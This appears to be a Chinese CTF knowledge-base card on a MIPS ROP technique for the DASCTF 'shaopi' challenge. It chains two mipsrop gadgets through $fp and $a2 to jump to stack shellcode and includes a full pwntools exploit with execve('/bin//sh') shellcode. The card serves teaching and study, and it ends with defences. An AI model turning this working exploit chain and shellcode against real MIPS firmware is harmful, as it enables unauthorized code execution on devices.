---
id: binary-pwn-rop-mips-fp-a2-gadget-stack-shellcode
title: MIPS mipsrop 控制 $fp/$a2 跳栈上 shellcode：addiu $a2,$sp,0x58; jalr $fp 接 move $t9,$a2; jalr $a2
type: scenario
domain: binary
path: binary/pwn/rop
technique: mips-fp-a2-gadget-stack-shellcode
tags:
- pwn
- mips
- mipsel
- mipsrop
- gadget
- stack-overflow
- shellcode
- fp
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V597
  verified_at: '2026-11-12T16:53:30+08:00'
  notes: 已对照原文与 39 张图核对（DASCTF shaopi）：mipsrop.stackfinders 命中 0x0043965C addiu $a2,$sp,0x68+var_10(即 sp+0x58);jalr $fp，mipsrop.find('move $t9,$a2') 命中 0x0040ABB8 move $t9,$a2;jalr $a2；fp 在 buf+0x40、ra 在 buf+0x44，sp+0x58=buf+0xa0，payload 与 exp/getshell 截图一致。已把误引的 ret2text 尾声指令替换为本文 0x400CB4 尾声，并把搜索串改为 0x68+var_10。dedup 候选 binary-pwn-rop-mips32-stack-frame-gadget-args 为 fp+4/万能 gadget 基础，非同链。原文未标版本，affected_versions 留空。
url: /docs/binary/pwn/rop/binary-pwn-rop-mips-fp-a2-gadget-stack-shellcode/
draft: false
kb_aliases:
- shaopi
- mipsrop 栈上 shellcode
- addiu a2 sp 0x58 jalr fp
- move t9 a2 jalr a2
- MIPS fp 控制跳转
- mipsrop.stackfinders
---

## 一句话结论

MIPS 栈溢出能同时控制保存的 `$fp` 与 `$ra`、但不知道栈地址时，可用 mipsrop 找到 `addiu $a2,$sp,0x58; jalr $fp` 与 `move $t9,$a2; jalr $a2` 两段 gadget：前者把 `$a2` 设为 `$sp+0x58`（相对当前栈，无需泄露），后者把 `$a2` 转到 `$t9` 并 `jalr` 过去，于是控制流跳到栈上相对偏移处的 shellcode 执行 `execve`。

## 原理

- MIPS 函数尾声从栈上恢复 `$ra`/`$fp` 后 `jr $ra`（本文 shaopi 的尾声在 0x400CB4：`lw $ra,0x90+var_s4($sp); lw $fp,0x90+var_s0($sp); addiu $sp,0x98; jr $ra`）。溢出到保存的 `$fp`/`$ra` 槽位后，`jr $ra` 执行的第一段 gadget 可控，且 `$fp` 也已被设为第二段 gadget 地址。
- 不泄露栈地址的跳转：第一段 `addiu $a2,$sp,0x58; jalr $fp` 以当前 `$sp` 为基准计算 `$a2`（`$sp` 此时指向 payload 内固定偏移），并把控制权交给 `$fp` 指向的第二段 gadget。
- 第二段 `move $t9,$a2; jalr $a2` 把 `$a2` 复制到 `$t9` 并跳转 `$a2`——即跳到 `$sp+0x58` 处。攻击者在 payload 的对应相对偏移放置 MIPS shellcode，即可执行。
- 相对偏移计算：payload 前 0x40 字节到保存 `$fp`，0x44 到保存 `$ra`；gadget 执行时 `$sp` 已相对缓冲区移动，实测 `$sp+0x58` 对应缓冲区偏移 0xa0（原文：`a2` 距离 buf 偏移 0xa0），所以 `payload.ljust(0xa0) + shellcode`。
- shellcode：MIPS O32 下 `execve("/bin//sh", NULL, NULL)` 系统调用号 4011（十进制），用 `lui/ori/sw` 把字符串写到栈上再 `syscall 0x40404`。
- 前提：MIPS 程序 NX 关闭（栈可执行）、无 PIE（gadget 地址固定）、能溢出到 `$fp`/`$ra`；入口处的 base64 passphrase 只是题目校验，不属于漏洞链。

## 触发条件

- MIPS32 little-endian 程序，栈溢出可控保存的 `$fp` 与 `$ra`，无 PIE/ASLR 或地址已知。
- NX 关闭/栈可执行，或可通过 mprotect 转为可执行。
- 能用 mipsrop 找到 `addiu $a2,$sp,<imm>; jalr $fp` 类 gadget，以及 `move $t9,$a2; jalr $a2` 类 gadget。
- payload 相对偏移可容纳 shellcode（本例 0xa0 之后）。

## 利用步骤

1. `checksec`/`file` 确认 mipsel、No PIE、NX disabled、RWX；本地用 `qemu-mipsel -L /usr/mipsel-linux-gnu/ ./pwn` 运行。
2. 用 `mipsrop.stackfinders()` 搜索 `addiu $a2,$sp,0x68+var_10`（即 `$sp+0x58`）`; jalr $fp`，记录地址（本例 0x0043965C）。
3. 用 `mipsrop.find("move $t9,$a2")` 找到 `move $t9,$a2; jalr $a2`（本例 0x0040ABB8）。
4. 计算 `$sp+imm` 相对缓冲区起点的偏移（gdb `tele $sp` 与 `x/x` 相减，本例 0xa0）。
5. 构造 payload：`b'a'*0x40 + p32(gadget2) + p32(gadget1)`（0x40 处为 `$fp`=gadget2，0x44 处为 `$ra`=gadget1），`ljust(0xa0,'a') + shellcode`。
6. 通过入口校验（本例 base64 解码后的 passphrase），发送 payload，`$sp+0x58` 处执行 shellcode，拿到 shell。

## PoC

```python
from pwn import *
context.arch = 'mips'; context.os = 'linux'

p = process(["qemu-mipsel", "-L", "./", "./pwn"])
p.sendlineafter('your passphrase: ', '三元一串十元三串')   # base64: 5LiJ5YWD5LiA5Liy5Y2B5YWD5LiJ5Liy

shellcode = asm('''
lui $t6,0x6e69
ori $t6,$t6,0x622f
sw $t6,28($sp)

lui $t7,0x6873
ori $t7,$t7,0x2f2f
sw $t7,32($sp)
sw $zero,36($sp)

la $a0,28($sp)
addiu $a1,$zero,0
addiu $a2,$zero,0
addiu $v0,$zero,4011
syscall 0x40404
''')

pl  = b'a'*0x40 + p32(0x0040ABB8) + p32(0x0043965C)
pl  = pl.ljust(0xa0, b'a') + shellcode
p.sendafter('Congratulation!\n', pl)
p.interactive()
```

注：gadget 地址与 0xa0 偏移需按目标重算；`p32` 按小端打包。

## 变体与关联

- 变体：把 `$a2` 换成 `$a0/$a1/$t9` 的相对寻址 gadget；用 `move $sp,$fp` 直接迁移栈；把 shellcode 写到 BSS/堆再跳转以绕 NX。
- 关联：与[[binary-pwn-rop-mips32-stack-frame-gadget-args]]同属 MIPS ROP/寄存器 gadget，本卡专门利用 `$fp`+`$a2` 两段跳转到栈上 shellcode；[[binary-pwn-rop-mips32-shellcode-cache-coherence-sleep]]处理 MIPS 栈上 shellcode 的 I/D cache 同步，本卡若执行异常可加 sleep/cacheflush 变体。
- 边界：需要能同时控制 `$fp` 与 `$ra`；若 gadget 的 `$sp` 偏移随调用路径变化，需以 gdb 实测修正。

## 检测与防御

- 防御：开启 NX/PIE/ASLR 与栈保护；剥离/裁剪含 `addiu $a2,$sp; jalr $fp`、`move $t9,$a2; jalr $a2` 的 gadget（编译优化与链接脚本可控）；对 CTF 固件做加固检查。
- 检测：二进制 checksec 门禁；运行时监控栈指针/控制流跳转到数据段（需硬件或沙箱支持）；CTF 外无通用检测。
